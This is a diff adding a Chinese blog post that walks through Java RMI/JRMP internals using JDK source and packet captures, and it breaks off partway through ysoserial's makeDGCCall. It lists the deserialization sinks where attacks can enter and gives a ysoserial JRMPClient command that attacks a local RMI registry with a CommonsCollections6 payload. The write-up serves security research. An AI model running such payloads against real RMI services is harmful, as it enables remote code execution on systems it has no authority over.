+                        ? clientAddr.getHostAddress()
+                        : &quot;0.0.0.0&quot;);
+
+/*
+    * Execute connection handler in the thread pool,
+    * which uses non-system threads.
+    */
+try &#123;
+    connectionThreadPool.execute(
+        new ConnectionHandler(socket, clientHost));
+&#125; catch (RejectedExecutionException e) &#123;
+    closeSocket(socket);
+    tcpLog.log(Log.BRIEF,
+                &quot;rejected connection from &quot; + clientHost);
+&#125;
+</code></pre>
+<p>这里看到ConnectionHandler的run()方法中又调用了run0(),其实前面说了那么多真正处理socket请求的方法就是run0(),<strong>其实这也是JRMP的实现</strong>。JRMP就是rmi底层网络传输的协议。</p>
+<pre><code>public void run() &#123;
+    Thread t = Thread.currentThread();
+    String name = t.getName();
+    try &#123;
+        t.setName(&quot;RMI TCP Connection(&quot; +
+                    connectionCount.incrementAndGet() +
+                    &quot;)-&quot; + remoteHost);
+        AccessController.doPrivileged((PrivilegedAction&lt;Void&gt;)() -&gt; &#123;
+            run0();
+            return null;
+        &#125;, NOPERMS_ACC);
+    &#125; finally &#123;
+        t.setName(name);
+    &#125;
+&#125;
+</code></pre>
+<p>第一部分是客户端发送的第一个数据包的处理部分，可以结合wireshark抓包看一下。</p>
+<pre><code>private void run0() &#123;
+    TCPEndpoint endpoint = getEndpoint();
+    int port = endpoint.getPort();
+
+    threadConnectionHandler.set(this);
+
+    // set socket to disable Nagle&#39;s algorithm (always send
+    // immediately)
+    // TBD: should this be left up to socket factory instead?
+    try &#123;
+        socket.setTcpNoDelay(true);
+    &#125; catch (Exception e) &#123;
+        // if we fail to set this, ignore and proceed anyway
+    &#125;
+    // set socket to timeout after excessive idle time
+    try &#123;
+        if (connectionReadTimeout &gt; 0)
+            socket.setSoTimeout(connectionReadTimeout);
+    &#125; catch (Exception e) &#123;
+        // too bad, continue anyway
+    &#125;
+
+    try &#123;
+        InputStream sockIn = socket.getInputStream();
+        InputStream bufIn = sockIn.markSupported()
+                ? sockIn
+                : new BufferedInputStream(sockIn);
+
+        // Read magic
+        DataInputStream in = new DataInputStream(bufIn);
+        int magic = in.readInt();
+
+        // read and verify transport header
+        short version = in.readShort();
+        if (magic != TransportConstants.Magic ||
+            version != TransportConstants.Version) &#123;
+            // protocol mismatch detected...
+            // just close socket: this would recurse if we marshal an
+            // exception to the client and the protocol at other end
+            // doesn&#39;t match.
+            closeSocket(socket);
+            return;
+        &#125;
+
+        OutputStream sockOut = socket.getOutputStream();
+        BufferedOutputStream bufOut =
+            new BufferedOutputStream(sockOut);
+        DataOutputStream out = new DataOutputStream(bufOut);
+
+        int remotePort = socket.getPort();
+
+        if (tcpLog.isLoggable(Log.BRIEF)) &#123;
+            tcpLog.log(Log.BRIEF, &quot;accepted socket from [&quot; +
+                                remoteHost + &quot;:&quot; + remotePort + &quot;]&quot;);
+        &#125;
+
+        TCPEndpoint ep;
+        TCPChannel ch;
+        TCPConnection conn;
+
+        // send ack (or nack) for protocol
+        byte protocol = in.readByte();
+</code></pre>
+<p><img src="/images/20230422221002.png"></p>
+<p>代码中读取了三次输入流，对应wireshark红框中的三个</p>
+<pre><code>int magic = in.readInt();
+short version = in.readShort();
+byte protocol = in.readByte();
+</code></pre>
+<p>然后根据protocal进入对应的case分支语句。</p>
+<pre><code>switch (protocol) &#123;
+    case TransportConstants.StreamProtocol:
+        // send ack
+        out.writeByte(TransportConstants.ProtocolAck);
+
+        // suggest endpoint (in case client doesn&#39;t know host name)
+        if (tcpLog.isLoggable(Log.VERBOSE)) &#123;
+            tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +
+                &quot;) &quot; + &quot;suggesting &quot; + remoteHost + &quot;:&quot; +
+                remotePort);
+        &#125;
+
+        out.writeUTF(remoteHost);
+        out.writeInt(remotePort);
+        out.flush();
+
+        // read and discard (possibly bogus) endpoint
+        // REMIND: would be faster to read 2 bytes then skip N+4
+        String clientHost = in.readUTF();
+        int    clientPort = in.readInt();
+        if (tcpLog.isLoggable(Log.VERBOSE)) &#123;
+            tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +
+                &quot;) client using &quot; + clientHost + &quot;:&quot; + clientPort);
+        &#125;
+
+        // create dummy channel for receiving messages
+        // (why not use clientHost and clientPort?)
+        ep = new TCPEndpoint(remoteHost, socket.getLocalPort(),
+                                endpoint.getClientSocketFactory(),
+                                endpoint.getServerSocketFactory());
+        ch = new TCPChannel(TCPTransport.this, ep);
+        conn = new TCPConnection(ch, socket, bufIn, bufOut);
+
+        // read input messages
+        handleMessages(conn, true);
+        break;
+</code></pre>
+<p>protocal是0x4b(75)，对应的第二个case分支，在这个case里面，可以看到前面先发送了ack,包含host，port和一个ack标志。</p>
+<pre><code>out.writeByte(TransportConstants.ProtocolAck);//78（0x4e）
+out.writeUTF(remoteHost);
+out.writeInt(remotePort);
+out.flush();
+</code></pre>
+<p>对应wireshark第二个数据包<br><img src="/images/20230422221503.png"></p>
+<p>然后下面它又重新封装了一个TCPConnection对象传入handleMessage函数中。</p>
+<pre><code>void handleMessages(Connection conn, boolean persistent) &#123;
+    int port = getEndpoint().getPort();
+
+    try &#123;
+        DataInputStream in = new DataInputStream(conn.getInputStream());
+        do &#123;
+            int op = in.read();     // transport op
+            if (op == -1) &#123;
+                if (tcpLog.isLoggable(Log.BRIEF)) &#123;
+                    tcpLog.log(Log.BRIEF, &quot;(port &quot; +
+                        port + &quot;) connection closed&quot;);
+                &#125;
+                break;
+            &#125;
+
+            if (tcpLog.isLoggable(Log.BRIEF)) &#123;
+                tcpLog.log(Log.BRIEF, &quot;(port &quot; + port +
+                    &quot;) op = &quot; + op);
+            &#125;
+
+            switch (op) &#123;
+                case TransportConstants.Call:
+                // service incoming RMI call
+                RemoteCall call = new StreamRemoteCall(conn);
+                if (serviceCall(call) == false)
+                    return;
+                break;
+</code></pre>
+<p>这个方法监听客户端请求，进入对应case，这里的请求是Call，所以进入第一个分支。先是创建了一个StreamRemoteCall对象，然后执行serviceCall(call)</p>
+<pre><code>    public boolean serviceCall(final RemoteCall call) &#123;
+        try &#123;
+            /* read object id */
+            final Remote impl;
+            ObjID id;
+
+            try &#123;
+                id = ObjID.read(call.getInputStream());
+            &#125; catch (java.io.IOException e) &#123;
+                throw new MarshalException(&quot;unable to read objID&quot;, e);
+            &#125;
+
+            /* get the remote object */
+            Transport transport = id.equals(dgcID) ? null : this;
+            Target target =
+                ObjectTable.getTarget(new ObjectEndpoint(id, transport));
+
+            if (target == null || (impl = target.getImpl()) == null) &#123;
+                throw new NoSuchObjectException(&quot;no such object in table&quot;);
+            &#125;
+
+            final Dispatcher disp = target.getDispatcher();
+            target.incrementCallCount();
+            try &#123;
+                /* call the dispatcher */
+                transportLog.log(Log.VERBOSE, &quot;call dispatcher&quot;);
+
+                final AccessControlContext acc =
+                    target.getAccessControlContext();
+                ClassLoader ccl = target.getContextClassLoader();
+
+                ClassLoader savedCcl = Thread.currentThread().getContextClassLoader();
+
+                try &#123;
+                    setContextClassLoader(ccl);
+                    currentTransport.set(this);
+                    try &#123;
+                        java.security.AccessController.doPrivileged(
+                            new java.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;
+                            public Void run() throws IOException &#123;
+                                checkAcceptPermission(acc);
+                                disp.dispatch(impl, call);
+                                return null;
+                            &#125;
+                        &#125;, acc);
+                    &#125; catch (java.security.PrivilegedActionException pae) &#123;
+                        throw (IOException) pae.getException();
+                    &#125;
+                &#125; finally &#123;
+                    setContextClassLoader(savedCcl);
+                    currentTransport.set(null);
+                &#125;
+
+            &#125; catch (IOException ex) &#123;
+                transportLog.log(Log.BRIEF,
+                                &quot;exception thrown by dispatcher: &quot;, ex);
+                return false;
+            &#125; finally &#123;
+                target.decrementCallCount();
+            &#125;
+
+        &#125; catch (RemoteException e) &#123;
+
+            // if calls are being logged, write out exception
+            if (UnicastServerRef.callLog.isLoggable(Log.BRIEF)) &#123;
+                // include client host name if possible
+                String clientHost = &quot;&quot;;
+                try &#123;
+                    clientHost = &quot;[&quot; +
+                        RemoteServer.getClientHost() + &quot;] &quot;;
+                &#125; catch (ServerNotActiveException ex) &#123;
+                &#125;
+                String message = clientHost + &quot;exception: &quot;;
+                UnicastServerRef.callLog.log(Log.BRIEF, message, e);
+            &#125;
+            try &#123;
+                ObjectOutput out = call.getResultStream(false);
+                UnicastServerRef.clearStackTraces(e);
+                out.writeObject(e);
+                call.releaseOutputStream();
+
+            &#125; catch (IOException ie) &#123;
+                transportLog.log(Log.BRIEF,
+                    &quot;exception thrown marshalling exception: &quot;, ie);
+                return false;
+            &#125;
+        &#125;
+
+        return true;
+    &#125;
+&#125;
+</code></pre>
+<p>前面我们在创建代理对象的时候每个stub最后都被封装到了Target对象中最后保存到了静态对象ObjectTable.objTable中。这个函数里面开始根据id，transport获取了RegistryImpl_Stub对应的target，然后下面获取dispatcher，实际上就是UnicastServerRef对象。然后调用了disp.dispatch(impl, call)，impl是从target中获取的，call是前面传递的函数参数。</p>
+<pre><code>public void dispatch(Remote obj, RemoteCall call) throws IOException &#123;
+    // positive operation number in 1.1 stubs;
+    // negative version number in 1.2 stubs and beyond...
+    int num;
+    long op;
+
+    try &#123;
+        // read remote call header
+        ObjectInput in;
+        try &#123;
+            in = call.getInputStream();
+            num = in.readInt();
+        &#125; catch (Exception readEx) &#123;
+            throw new UnmarshalException(&quot;error unmarshalling call header&quot;,
+                                         readEx);
+        &#125;
+        if (skel != null) &#123;
+            // If there is a skeleton, use it
+                oldDispatch(obj, call, num);
+                return;
+
+        &#125; else if (num &gt;= 0)&#123;
+            throw new UnmarshalException(
+                    &quot;skeleton class not found but required for client version&quot;);
+        &#125;
+        try &#123;
+            op = in.readLong();
+        &#125; catch (Exception readEx) &#123;
+            throw new UnmarshalException(&quot;error unmarshalling call header&quot;,
+                    readEx);
+        &#125;
+</code></pre>
+<p>先读取了call数据包中的操作码，判断客户端是查询对象还是绑定远程对象或者解绑等操作。</p>
+<pre><code>num = in.readInt();
+</code></pre>
+<p>如果skel不为空（RegistryImpl_Skel对象），调用oldDispatch()</p>
+<pre><code>private void oldDispatch(Remote obj, RemoteCall call, int op)
+    throws Exception
+&#123;
+    long hash;              // hash for matching stub with skeleton
+
+    // read remote call header
+    ObjectInput in;
+    in = call.getInputStream();
+    try &#123;
+        Class&lt;?&gt; clazz = Class.forName(&quot;sun.rmi.transport.DGCImpl_Skel&quot;);
+        if (clazz.isAssignableFrom(skel.getClass())) &#123;
+            ((MarshalInputStream)in).useCodebaseOnly();
+        &#125;
+    &#125; catch (ClassNotFoundException ignore) &#123; &#125;
+
+    try &#123;
+        hash = in.readLong();
+    &#125; catch (Exception ioe) &#123;
+        throw new UnmarshalException(&quot;error unmarshalling call header&quot;, ioe);
+    &#125;
+
+    // if calls are being logged, write out object id and operation
+    Operation[] operations = skel.getOperations();
+    logCall(obj, op &gt;= 0 &amp;&amp; op &lt; operations.length ?  operations[op] : &quot;op: &quot; + op);
+    unmarshalCustomCallData(in);
+    // dispatch to skeleton for remote object
+    skel.dispatch(obj, call, op, hash);
+&#125;
+</code></pre>
+<p>主要是调用skel.dispatch(obj, call, op, hash)<br>obj就是前面从target中获取的RegistryImpl_Stub,call是前面创建的客户端连接，op是前面读取的操作数，hash是读取的序列化对象的hash值，用于在反序列化前判断。</p>
+<pre><code>public void dispatch(java.rmi.Remote obj, java.rmi.server.RemoteCall remoteCall, int opnum, long hash)
+        throws java.lang.Exception &#123;
+    if (opnum &lt; 0) &#123;
+        if (hash == 7583982177005850366L) &#123;
+            opnum = 0;
+        &#125; else if (hash == 2571371476350237748L) &#123;
+            opnum = 1;
+        &#125; else if (hash == -7538657168040752697L) &#123;
+            opnum = 2;
+        &#125; else if (hash == -8381844669958460146L) &#123;
+            opnum = 3;
+        &#125; else if (hash == 7305022919901907578L) &#123;
+            opnum = 4;
+        &#125; else &#123;
+            throw new java.rmi.UnmarshalException(&quot;invalid method hash&quot;);
+        &#125;
+    &#125; else &#123;
+        if (hash != interfaceHash)
+            throw new java.rmi.server.SkeletonMismatchException(&quot;interface hash mismatch&quot;);
+    &#125;
+
+    sun.rmi.registry.RegistryImpl server = (sun.rmi.registry.RegistryImpl) obj;
+    StreamRemoteCall call = (StreamRemoteCall) remoteCall;
+    switch (opnum) &#123;
+        case 0: // bind(String, Remote)
+        &#123;
+            // Check access before reading the arguments
+            RegistryImpl.checkAccess(&quot;Registry.bind&quot;);
+
+            java.lang.String $param_String_1;
+            java.rmi.Remote $param_Remote_2;
+            try &#123;
+                ObjectInputStream in = (ObjectInputStream)call.getInputStream();
+                $param_String_1 =
+                        SharedSecrets.getJavaObjectInputStreamReadString().readString(in);
+                $param_Remote_2 = (java.rmi.Remote) in.readObject();
+            &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;
+                call.discardPendingRefs();
+                throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
+            &#125; finally &#123;
+                call.releaseInputStream();
+            &#125;
+            server.bind($param_String_1, $param_Remote_2);
+            try &#123;
+                call.getResultStream(true);
+            &#125; catch (java.io.IOException e) &#123;
+                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
+            &#125;
+            break;
+        &#125;
+
+        case 1: // list()
+        &#123;
+            call.releaseInputStream();
+            java.lang.String[] $result = server.list();
+            try &#123;
+                java.io.ObjectOutput out = call.getResultStream(true);
+                out.writeObject($result);
+            &#125; catch (java.io.IOException e) &#123;
+                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
+            &#125;
+            break;
+        &#125;
+
+        case 2: // lookup(String)
+        &#123;
+            java.lang.String $param_String_1;
+            try &#123;
+                ObjectInputStream in = (ObjectInputStream)call.getInputStream();
+                $param_String_1 =
+                        SharedSecrets.getJavaObjectInputStreamReadString().readString(in);
+            &#125; catch (ClassCastException | IOException e) &#123;
+                call.discardPendingRefs();
+                throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
+            &#125; finally &#123;
+                call.releaseInputStream();
+            &#125;
+            java.rmi.Remote $result = server.lookup($param_String_1);
+            try &#123;
+                java.io.ObjectOutput out = call.getResultStream(true);
+                out.writeObject($result);
+            &#125; catch (java.io.IOException e) &#123;
+                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
+            &#125;
+            break;
+        &#125;
+
+        case 3: // rebind(String, Remote)
+        &#123;
+            // Check access before reading the arguments
+            RegistryImpl.checkAccess(&quot;Registry.rebind&quot;);
+
+            java.lang.String $param_String_1;
+            java.rmi.Remote $param_Remote_2;
+            try &#123;
+                ObjectInputStream in = (ObjectInputStream)call.getInputStream();
+                $param_String_1 =
+                        SharedSecrets.getJavaObjectInputStreamReadString().readString(in);
+                $param_Remote_2 = (java.rmi.Remote) in.readObject();
+            &#125; catch (ClassCastException | IOException | java.lang.ClassNotFoundException e) &#123;
+                call.discardPendingRefs();
+                throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
+            &#125; finally &#123;
+                call.releaseInputStream();
+            &#125;
+            server.rebind($param_String_1, $param_Remote_2);
+            try &#123;
+                call.getResultStream(true);
+            &#125; catch (java.io.IOException e) &#123;
+                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
+            &#125;
+            break;
+        &#125;
+
+        case 4: // unbind(String)
+        &#123;
+            // Check access before reading the arguments
+            RegistryImpl.checkAccess(&quot;Registry.unbind&quot;);
+
+            java.lang.String $param_String_1;
+            try &#123;
+                ObjectInputStream in = (ObjectInputStream)call.getInputStream();
+                $param_String_1 =
+                        SharedSecrets.getJavaObjectInputStreamReadString().readString(in);
+            &#125; catch (ClassCastException | IOException e) &#123;
+                call.discardPendingRefs();
+                throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
+            &#125; finally &#123;
+                call.releaseInputStream();
+            &#125;
+            server.unbind($param_String_1);
+            try &#123;
+                call.getResultStream(true);
+            &#125; catch (java.io.IOException e) &#123;
+                throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
+            &#125;
+            break;
+        &#125;
+
+        default:
+            throw new java.rmi.UnmarshalException(&quot;invalid method number&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>}</p>
+<p>通过hash值判断进入哪个case，这里进入case2(实际就是lookup的逻辑)，server是obj强转后的RegistryImpl对象，调用它的lookup方法得到$result</p>
+<pre><code>java.rmi.Remote $result = server.lookup($param_String_1);
+</code></pre>
+<p>然后写入输出流中</p>
+<pre><code>out.writeObject($result);
+</code></pre>
+<p>执行完后回到dispatch中的finnally语句，将输出流中的数据发送出去。</p>
+<pre><code>call.releaseInputStream(); // in case skeleton doesn&#39;t
+call.releaseOutputStream();
+</code></pre>
+<p>但是客户端读取到的是代理对象，而服务端当时调用bind绑定的是远程对象，原因是我们进入writeOject方法</p>
+<pre><code>public final void writeObject(Object obj) throws IOException &#123;
+    if (enableOverride) &#123;
+        writeObjectOverride(obj);
+        return;
+    &#125;
+    try &#123;
+        writeObject0(obj, false);
+    &#125; catch (IOException ex) &#123;
+        if (depth == 0) &#123;
+            writeFatalException(ex);
+        &#125;
+        throw ex;
+    &#125;
+&#125;
+</code></pre>
+<p>其中调用了writeObject0方法，继续进入</p>
+<pre><code>if (enableReplace) &#123;
+    Object rep = replaceObject(obj);
+    if (rep != obj &amp;&amp; rep != null) &#123;
+        cl = rep.getClass();
+        desc = ObjectStreamClass.lookup(cl, true);
+    &#125;
+    obj = rep;
+&#125;
+</code></pre>
+<p>主要关注到其中调用了replaceObject方法，可能里面返回了对应的代理对象，进入replaceObject方法</p>
+<pre><code>protected final Object replaceObject(Object obj) throws IOException &#123;
+    if ((obj instanceof Remote) &amp;&amp; !(obj instanceof RemoteStub)) &#123;
+        Target target = ObjectTable.getTarget((Remote) obj);
+        if (target != null) &#123;
+            return target.getStub();
+        &#125;
+    &#125;
+    return obj;
+&#125;
+</code></pre>
+<p>使用远程对象在ObjectTable中查找了其对应的代理对象，并返回，所以我们客户端获取到的是代理对象。</p>
+<pre><code>Target target = ObjectTable.getTarget((Remote) obj)
+return target.getStub();
+</code></pre>
+<p>客户端执行代理对象：</p>
+<p>上面执行完后，客户端成功获取到了代理对象，如果我们想要执行对象的方法，就在对应的RemoteObjectInvocationHandler代理类的invoke方法中</p>
+<pre><code>public Object invoke(Object proxy, Method method, Object[] args)
+    throws Throwable
+&#123;
+    if (! Proxy.isProxyClass(proxy.getClass())) &#123;
+        throw new IllegalArgumentException(&quot;not a proxy&quot;);
+    &#125;
+
+    if (Proxy.getInvocationHandler(proxy) != this) &#123;
+        throw new IllegalArgumentException(&quot;handler mismatch&quot;);
+    &#125;
+
+    if (method.getDeclaringClass() == Object.class) &#123;
+        return invokeObjectMethod(proxy, method, args);
+    &#125; else if (&quot;finalize&quot;.equals(method.getName()) &amp;&amp; method.getParameterCount() == 0) &#123;
+        return null; // ignore
+    &#125; else &#123;
+        return invokeRemoteMethod(proxy, method, args);
+    &#125;
+&#125;
+</code></pre>
+<p>可以看到前面做了一些判断，然后判断调用的方法是否存在Object对象中(如hashcode，toString等)，这些方法可以就在本地调用。其他的方法就调用invokeRemoteMethod(proxy, method, args)实现远程调用。跟进invokeRemoteMethod()方法可以看到它主要调用了UnicastRef.invoke()方法，继续跟进。</p>
+<pre><code>return ref.invoke((Remote) proxy, method, args,
+                    getMethodHash(method));
+</code></pre>
+<p>在这个函数中使用JRMP协议调用远程对象的方法，协议交互过程和lookup类似，先创建一个连接</p>
+<pre><code>call = new StreamRemoteCall(conn, ref.getObjID(), -1, opnum);
+</code></pre>
+<p>自定义握手过程，然后将param通过marshalValue()方法序列化写入输出流</p>
+<pre><code>ObjectOutput out = call.getOutputStream();
+marshalCustomCallData(out);
+Class&lt;?&gt;[] types = method.getParameterTypes();
+for (int i = 0; i &lt; types.length; i++) &#123;
+    marshalValue(types[i], params[i], out);
+&#125;
+</code></pre>
+<p>然后调用call.executeCall()将参数发送给服务端，然后判断返回值，如果是void就直接返回null，本次调用结束，否则调用unmarshalValue()获取返回值最后释放连接返回结果。</p>
+<pre><code>Class&lt;?&gt; rtype = method.getReturnType();
+if (rtype == void.class)
+    return null;
+ObjectInput in = call.getInputStream();
+
+/* StreamRemoteCall.done() does not actually make use
+* of conn, therefore it is safe to reuse this
+* connection before the dirty call is sent for
+* registered refs.
+*/
+Object returnValue = unmarshalValue(rtype, in);
+...
+ref.getChannel().free(conn, true);
+return returnValue;
+</code></pre>
+<h3 id="流量总结"><a href="#流量总结" class="headerlink" title="流量总结"></a>流量总结</h3><p>客户端：<br>第一个数据包：</p>
+<pre><code>sun.rmi.transport.tcp.TCPChannel#createConnection
+
+dataOut.writeInt(TransportConstants.Magic);//0x4a524d49
+dataOut.writeShort(TransportConstants.Version);//2
+out.writeByte(TransportConstants.StreamProtocol);//0x4b
+</code></pre>
+<p>第二个数据包：</p>
+<pre><code>sun.rmi.transport.tcp.TCPChannel#createConnection
+
+out.writeUTF(localEp.getHost());
+out.writeInt(localEp.getPort());
+</code></pre>
+<p>第三个数据包：</p>
+<pre><code>conn.getOutputStream().write(TransportConstants.Call);//0x50
+out.writeInt(op);//2
+out.writeLong(hash); //4905912898345647071L
+var3.writeObject(var1);//remote
+</code></pre>
+<p>DGC：</p>
+<p>第四个数据包：</p>
+<pre><code>sun.rmi.transport.tcp.TCPChannel#createConnection
+
+dataOut.writeInt(TransportConstants.Magic);//0x4a524d49
+dataOut.writeShort(TransportConstants.Version);//2
+out.writeByte(TransportConstants.StreamProtocol);//0x4b
+</code></pre>
+<p>第五个数据包：</p>
+<pre><code>sun.rmi.transport.tcp.TCPChannel#createConnection
+
+out.writeUTF(localEp.getHost());
+out.writeInt(localEp.getPort());
+</code></pre>
+<p>第六个数据包：</p>
+<pre><code>sun.rmi.transport.ConnectionInputStream#done
+
+var5.writeByte(84);
+
+//count = -32723
+//time = 1682244482248
+//unique = -681994373
+out.writeInt(unique);
+out.writeLong(time);
+out.writeShort(count);
+</code></pre>
+<p>服务端：</p>
+<p>第一个响应包：</p>
+<pre><code>int var6 = var5.readInt();//1246907721
+short var7 = var5.readShort();//2
+byte var15 = var5.readByte();//75
+var10.writeByte(78);
+var10.writeUTF(this.remoteHost);//127.0.0.1
+var10.writeInt(var11);//1102 this.socket.getPort();
+</code></pre>
+<p>lookup响应包：</p>
+<pre><code>sun.rmi.transport.tcp.TCPTransport#handleMessages
+int var5 = var4.read();//80
+var1.getInputStream();
+var39 = ObjID.read(var1.getInputStream());
+
+sun.rmi.server.UnicastServerRef#dispatch
+var3 = var41.readInt();//操作码2
+
+sun.rmi.server.UnicastServerRef#oldDispatch
+var4 = var6.readLong();//hash值
+
+sun.rmi.registry.RegistryImpl_Skel#dispatch
+
+var8 = SharedSecrets.getJavaObjectInputStreamReadString().readString(var9);//remote
+
+注意：java.io.ObjectOutputStream#writeObject0
+中的replaceObject(obj)将var81替换成了代理对象
+
+var83.writeObject(var81);//
+</code></pre>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于客户端而言反序列化漏洞的利用点主要有下面几个地方</p>
+<ul>
+<li>StreamRemoteCall.executeCall()中当this.in.readByte()为2时(line:169)</li>
+<li>RegistryImpl_Stub.lookup()读取服务端返回的代理对象(line:104)</li>
+<li>客户端读取服务端执行结果返回值(UnicastRef.unmarshalValue:302)</li>
+</ul>
+<p>对于服务端而言可能产生反序列化漏洞的利用点主要有下面几个地方</p>
+<ul>
+<li>服务端读取客户端(查询&#x2F;绑定&#x2F;解绑)对象字符串(RegistryImpl_Skel.dispatch)</li>
+<li>服务端读取客户端远程方法的参数值(UnicastServerRef.unmarshalValue:151)</li>
+</ul>
+<p>对于DGC而言</p>
+<ul>
+<li>sun.rmi.transport.DGCImpl_Stub#dirty DGC客户端的dirty操作中会调用ref.invoke（line:73）</li>
+<li>sun.rmi.transport.DGCImpl_Skel#dispatch DGC服务端的dispatch处理</li>
+</ul>
+<h2 id="DGC详解"><a href="#DGC详解" class="headerlink" title="DGC详解"></a>DGC详解</h2><p>DGC（Distributed Garbage Collection）—— 分布式垃圾回收，当 Server 端返回一个对象到 Client 端（远程方法的调用方）时，其跟踪远程对象在 Client 端中的使用。当再没有更多的对 Client 远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个 RMI 服务，就会伴随着 DGC 服务端的启动。</p>
+<p>很像 Registry、RegistryImpl、RegistryImpl_Stub、RegistryImpl_Skel，实际上不单是命名相近，处理逻辑也是类似的。通过在服务端和客户端之间传递引用，依旧是 Stub 与 Skel 之间的通信模式：Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 RegistryImpl_Skel 来处理。</p>
+<p>DGC 通信的处理类是 DGCImpl_Skel 的 dispatch 方法，依旧通过 Java 原生的序列化和反序列化来处理对象。</p>
+<pre><code>switch (opnum) &#123;
+    case 0: // clean(ObjID[], long, VMID, boolean)
+    &#123;
+        java.rmi.server.ObjID[] $param_arrayOf_ObjID_1;
+        long $param_long_2;
+        java.rmi.dgc.VMID $param_VMID_3;
+        boolean $param_boolean_4;
+        try &#123;
+            java.io.ObjectInput in = call.getInputStream();
+            $param_arrayOf_ObjID_1 = (java.rmi.server.ObjID[]) in.readObject();
+            $param_long_2 = in.readLong();
+            $param_VMID_3 = (java.rmi.dgc.VMID) in.readObject();
+            $param_boolean_4 = in.readBoolean();
+        &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;
+            call.discardPendingRefs();
+            throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
+        &#125; finally &#123;
+            call.releaseInputStream();
+        &#125;
+        server.clean($param_arrayOf_ObjID_1, $param_long_2, $param_VMID_3, $param_boolean_4);
+        try &#123;
+            call.getResultStream(true);
+        &#125; catch (java.io.IOException e) &#123;
+            throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
+        &#125;
+        break;
+    &#125;
+
+    case 1: // dirty(ObjID[], long, Lease)
+    &#123;
+        java.rmi.server.ObjID[] $param_arrayOf_ObjID_1;
+        long $param_long_2;
+        java.rmi.dgc.Lease $param_Lease_3;
+        try &#123;
+            java.io.ObjectInput in = call.getInputStream();
+            $param_arrayOf_ObjID_1 = (java.rmi.server.ObjID[]) in.readObject();
+            $param_long_2 = in.readLong();
+            $param_Lease_3 = (java.rmi.dgc.Lease) in.readObject();
+        &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;
+            call.discardPendingRefs();
+            throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
+        &#125; finally &#123;
+            call.releaseInputStream();
+        &#125;
+        java.rmi.dgc.Lease $result = server.dirty($param_arrayOf_ObjID_1, $param_long_2, $param_Lease_3);
+        try &#123;
+            java.io.ObjectOutput out = call.getResultStream(true);
+            out.writeObject($result);
+        &#125; catch (java.io.IOException e) &#123;
+            throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
+        &#125;
+        break;
+    &#125;
+
+    default:
+        throw new java.rmi.UnmarshalException(&quot;invalid method number&quot;);
+&#125;
+</code></pre>
+<p> 漏洞的触发点也就是这里的readObject，在clean之前对我们传的值做反序列化的操作，原理很简单，主要是解决如何和DGC服务端通信的问题。</p>
+<p>客户端DGCImpl_Stub#clean:</p>
+<pre><code>public void clean(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.VMID $param_VMID_3, boolean $param_boolean_4)
+        throws java.rmi.RemoteException &#123;
+    try &#123;
+        StreamRemoteCall call = (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this,
+                operations, 0, interfaceHash);
+        call.setObjectInputFilter(DGCImpl_Stub::leaseFilter);
+        try &#123;
+            java.io.ObjectOutput out = call.getOutputStream();
+            out.writeObject($param_arrayOf_ObjID_1);
+            out.writeLong($param_long_2);
+            out.writeObject($param_VMID_3);
+            out.writeBoolean($param_boolean_4);
+        &#125; catch (java.io.IOException e) &#123;
+            throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e);
+        &#125;
+        ref.invoke(call);
+        ref.done(call);
+    &#125; catch (java.lang.RuntimeException e) &#123;
+        throw e;
+    &#125; catch (java.rmi.RemoteException e) &#123;
+        throw e;
+    &#125; catch (java.lang.Exception e) &#123;
+        throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e);
+    &#125;
+&#125;
+</code></pre>
+<p>java.rmi.server.ObjID[] $param_arrayOf_ObjID_1做的序列化操作在DGCImpl_Skel#dispatch中会进行反序列化操作，那么只需要把ObjID[]替换为我们的payload即可达成利用，然而需要更改底层代码这种繁杂的操作yso早已替我们实现——ysoserial.exploit.JRMPClient#makeDGCCall:</p>
+<blockquote>
+<p>java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections6 “calc”</p>
+</blockquote>
+<pre><code>public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException &#123;
+    InetSocketAddress isa = new InetSocketAddress(hostname, port);
+    Socket s = null;
+    DataOutputStream dos = null;
+    try &#123;
+        s = SocketFactory.getDefault().createSocket(hostname, port);
+        s.setKeepAlive(true);
+        s.setTcpNoDelay(true);
+
+        OutputStream os = s.getOutputStream();
+        dos = new DataOutputStream(os);
+
+        dos.writeInt(TransportConstants.Magic);
+        dos.writeShort(TransportConstants.Version);
+        dos.writeByte(TransportConstants.SingleOpProtocol);
+
+        dos.write(TransportConstants.Call);
+
+        @SuppressWarnings ( &quot;resource&quot; )
+        final ObjectOutputStream objOut = new MarshalOutputStream(dos);
+
+        objOut.writeLong(2); // DGC
+        objOut.writeInt(0);
+        objOut.writeLong(0);
+        objOut.writeShort(0);
+
+        objOut.writeInt(1); // dirty
